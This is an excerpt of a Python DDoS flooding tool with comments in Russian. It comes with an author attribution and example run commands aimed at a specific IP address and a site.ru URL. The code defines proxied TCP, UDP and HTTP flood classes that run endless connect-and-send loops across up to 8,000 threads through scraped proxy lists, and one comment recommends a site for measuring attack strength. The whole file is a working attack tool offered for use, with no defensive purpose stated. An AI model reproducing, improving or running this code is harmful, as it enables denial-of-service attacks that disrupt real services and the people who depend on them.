...
__author__ = "Вычетко Георгий Борисович 43 года"
...
# python run.py -useragent useragents.txt -proxylist proxy.txt -getproxy 1 -url http://91.193.113.71

multiple = 1500  # Умножение, значение можно менять
threads = 8000  # Кол-во потоков, можно менять
...
parser = argparse.ArgumentParser(description='Fire in the hole!')
    ...
    try:
        ...
        for proxy in part:
            ...
            try:
                ...
                pass
        handle = open("proxy.txt", "a")  # Записываем полученные прокси в файл
        handle.write("")
...
#  Функция, которая определяет тип флуда
...
def typeflood():  # Определяем тип флуда
    ...
    if select == "UDP":
        choice1 = "2"
        choice2 = "y"  # Тестить мощь DoS-а или DDoS-а можно здесь: https://www.vedbex.com/tools/dstat
        choice3 = "0"
    if select == "HTTP":
        choice1 = "0"
        choice2 = "y"
...
#  Функция, запускающая нужный метод
...
def loop():
    ...
    if choice1 == "0":  # прописываем заголовки, чтобы не нагружать потоки
...
# Методы флуда через классы

class TcpFloodProxed(threading.Thread):  # класс много-поточности

    def __init__(self,
                 counter):  # Функция вызывается практически только на счетчик потоков. Параметр счетчика функции, передает x + 1 выше в качестве счетной переменной
    ...
    def run(self):  # функция, которая дает инструкции для потоков
        ...
        while True:
            try:
                socks.setdefaultproxy(socks.PROXY_TYPE_HTTP, str(proxy[0]), int(proxy[1]),
                                      True)  # команда для HTTP-проксирования
                s = socks.socksocket()  # создание сокета
                s.connect((str(url2), int(port)))  # подключение
                s.send(p)  # отправка
                print("Запрос отправлен с " + str(proxy[0] + ":" + proxy[1]) + " =>",
                      self.counter)  # вывод req + counter
    ...
    def run(self):  # функция, которая дает инструкции для  потоков
        ...
        while True:
            try:
                socks.setdefaultproxy(socks.PROXY_TYPE_HTTP, str(proxy[0]), int(proxy[1]),
                                      True)  # команда для HTTP-проксирования
                s: socks.socksocket() = socks.socksocket()  # создание сокета
                s.connect((str(url2), int(port)))  # подключение
                s.send(p)  # отправка
                print("Запрос отправлен с " + str(proxy[0] + ":" + proxy[1]) + " =>",
                      self.counter)  # вывод req + counter
...
class RequestProxyHTTP(threading.Thread):  # класс много-поточности
    ...
    def run(self):  # функция, которая дает инструкции для  потоков
        ...
        while True:  # бесконечный цикл
            try:
                ...
                s.connect((str(proxy[0]), int(proxy[1])))  # коннектимся к прокси
...
# Проверка - как запущена программа
...
# python run.py -useragent useragents.txt -proxylist proxy.txt -getproxy 1 -url https://site.ru
